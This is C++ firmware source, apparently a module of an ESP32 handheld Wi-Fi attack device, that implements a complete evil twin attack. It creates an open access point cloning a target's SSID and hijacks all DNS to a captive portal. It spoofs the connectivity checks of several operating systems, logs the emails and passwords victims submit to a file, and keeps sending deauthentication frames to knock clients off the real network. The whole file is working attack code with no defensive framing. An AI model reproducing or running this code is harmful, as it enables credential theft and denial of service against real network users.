// pid PID::EVIL_TWIN

#include <LittleFS.h>
#include "esp_wifi.h"

const char* EVIL_TWIN_CREDS_FILE = "/evil_twin_creds.txt";
IPAddress EVIL_TWIN_GATEWAY(172, 0, 0, 1);
IPAddress EVIL_TWIN_SUBNET(255, 255, 255, 0);
int evilTwinVictimCount = 0;

void evilTwinSaveCreds(String email, String password) {
	if (!lfsBegin()) return;

	File f = LittleFS.open(EVIL_TWIN_CREDS_FILE, FILE_APPEND);
	if (!f) {
		f = LittleFS.open(EVIL_TWIN_CREDS_FILE, FILE_WRITE);
		if (!f) return;
	}

	DeviceTime dt = deviceGetTime();
	char timeBuf[16];
	snprintf(timeBuf, sizeof(timeBuf), "%02d:%02d:%02d", dt.hours, dt.minutes, dt.seconds);

	String entry = String(timeBuf) + " | " + email + " | " + password + "\n";
	f.print(entry);
	f.close();

	evilTwinVictimCount++;
	soundSuccess();

	Serial.println("Evil Twin: captured " + email);
}

void evilTwinSetup() {
	WiFi.mode(WIFI_AP);
	WiFi.softAP(ssid, ""); // open network with target's SSID
	WiFi.softAPConfig(EVIL_TWIN_GATEWAY, EVIL_TWIN_GATEWAY, EVIL_TWIN_SUBNET);

	// DNS server — redirect ALL domains to captive portal
	dnsServer.start(53, "*", EVIL_TWIN_GATEWAY);

	// Captive portal detection endpoints (various OS)
	webServer.on("/generate_204", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/hotspot-detect.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/library/test/success.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/success.txt", []() {
		webServer.send(200, "text/plain", "success");
	});
	webServer.on("/ncsi.txt", []() {
		webServer.send(200, "text/plain", "Microsoft NCSI");
	});
	webServer.on("/connecttest.txt", []() {
		webServer.send(200, "text/plain", "Microsoft Connect Test");
	});
	webServer.on("/redirect", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/canonical.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});

	// Main portal page — reuse evil portal HTML
	webServer.on("/", []() {
		webServer.send(200, "text/html", evilPortalHTML());
	});

	// Login handler
	webServer.on("/login", []() {
		if (webServer.method() == HTTP_POST) {
			String email = webServer.arg("email");
			String password = webServer.arg("password");
			if (email.length() > 0 && password.length() > 0) {
				evilTwinSaveCreds(email, password);
			}
			webServer.send(200, "text/html", evilPortalSuccessHTML());
		} else {
			webServer.sendHeader("Location", "/", true);
			webServer.send(302, "text/plain", "");
		}
	});

	// Catch-all — redirect to portal
	webServer.onNotFound([]() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});

	webServer.begin();

	// Init deauth frame
	memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
}

void evilTwinSendDeauthFrame(const uint8_t* bssid, int chan) {
	esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
	delay(50);
	memcpy(&deauth_frame[10], bssid, 6);
	memcpy(&deauth_frame[16], bssid, 6);
	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false));
}

void evilTwinLoop() {
	if (isSetup()) {
		evilTwinSetup();
		isWebInterfaceEnabled = true;
		evilTwinVictimCount = 0;

		String lines[] = {
			L->TXT_WIFI_EVIL_TWIN_RUNNING,
			"SSID: " + String(ssid),
			"Victims: " + String(evilTwinVictimCount),
			String(EVIL_TWIN_CREDS_FILE)
		};
		centeredPrintRows(lines, 4, SMALL_TEXT);
	}

	dnsServer.processNextRequest();
	webServer.handleClient();

	// Send deauth frames to the real AP
	evilTwinSendDeauthFrame(bssid, channel);

	// Update victim counter on screen
	static int lastVictimCount = 0;
	if (evilTwinVictimCount != lastVictimCount) {
		lastVictimCount = evilTwinVictimCount;
		String lines[] = {
			L->TXT_WIFI_EVIL_TWIN_RUNNING,
			"SSID: " + String(ssid),
			"Victims: " + String(evilTwinVictimCount),
			String(EVIL_TWIN_CREDS_FILE)
		};
		centeredPrintRows(lines, 4, SMALL_TEXT);
	}

	checkExit();
}
